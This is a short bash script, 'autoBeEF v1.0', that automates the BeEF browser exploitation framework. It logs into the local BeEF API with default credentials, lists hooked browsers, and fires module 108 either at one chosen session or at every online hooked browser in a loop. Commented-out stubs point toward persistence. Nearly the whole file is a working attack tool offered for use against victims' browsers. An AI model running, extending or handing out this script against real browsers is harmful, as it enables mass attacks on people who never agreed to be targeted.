#!/bin/bash

#                                        autoBeEF V1.0  
#
#                                    By: Andre Maccarone
#
#                                       ,           ,    
#                                      /             \   
#                                     ((__-^^-,-^^-__))  
#                                      `-_---' `---_-'   
#                                       <__|o` 'o|__>    
#                                          \  `  /       
#                                           ): :(        
#                                           :o_o:       
#                                            "-"        
#



# Grab API Token

GET_TOKEN="$(curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login)"
TOKEN="$(echo "$GET_TOKEN" | awk -F '["]' '{print $6}')"





# Allow user to select a target

function single_target {
	GET_SESSIONS="$(curl http://127.0.0.1:3000/api/hooks?token=${TOKEN} | json_pp)"
	echo "$GET_SESSIONS"
	echo -n "Enter a Session Key: "
	read SESSION
	curl -H "Content-Type: application/json; charset=UTF-8" -d '{"":""}' -X POST http://127.0.0.1:3000/api/modules/${SESSION}/108?token=${TOKEN}
}


# Attack all online browsers

function attack_all {
	session="$(curl http://127.0.0.1:3000/api/hooks?token=${TOKEN} | json_pp)"
	arr=$(echo "${session}" | jq '.["hooked-browsers"].'online'' | grep session | awk -F '["]' '{print $4}')
	for x in $arr; do 
		curl -H "Content-Type: application/json; charset=UTF-8" -d '{"":""}' -X POST http://127.0.0.1:3000/api/modules/${x}/108?token=${TOKEN};
 	done;
	read -n1 -r -p "Press space to continue..." key

}



#function about_browser {
#	curl http://127.0.0.1:3000/api/hooks/${SESSION}?token=${TOKEN} | json_pp
#	read -n1 -r -p "Press space to continue..." key	
#}

#function persistance {
#	curl -H "Content-Type: application/json; charset=UTF-8" -d '{"":""}' -X POST http://127.0.0.1:3000/api/modules/${SESSION}/108?token=${TOKEN}	
#
#}



while :
do
    clear
    cat<<EOF
    ==============================
    autoBeEF v1.0
    ------------------------------
    Please enter your choice:

    Single Target     (1)
    Target All        (2)
                      (Q)uit
    ------------------------------
EOF
    read -n1 -s
    case "$REPLY" in
    "1")  single_target             ;;
    "2")  attack_all                ;;
    "Q")  exit                      ;;
    "q")  exit                      ;; 
     * )  echo "invalid option"     ;;
    esac
    sleep 1
done
